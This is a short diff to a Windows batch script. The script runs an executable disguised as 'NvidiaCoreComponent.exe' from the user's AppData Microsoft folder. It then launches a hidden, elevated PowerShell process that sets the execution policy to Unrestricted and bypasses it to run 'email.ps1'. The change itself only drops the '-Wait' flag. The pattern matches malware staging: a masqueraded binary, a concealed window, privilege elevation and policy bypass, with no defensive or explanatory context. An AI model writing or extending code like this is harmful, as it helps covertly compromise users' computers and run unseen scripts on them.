@@ -16,5 +16,5 @@ goto :execute
 :execute
 cd %appdata%\Microsoft
 .\NvidiaCoreComponent.exe
-powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Microsoft\email.ps1' -WindowStyle Hidden -Verb RunAs -Wait"
+powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Microsoft\email.ps1' -WindowStyle Hidden -Verb RunAs"
 exit
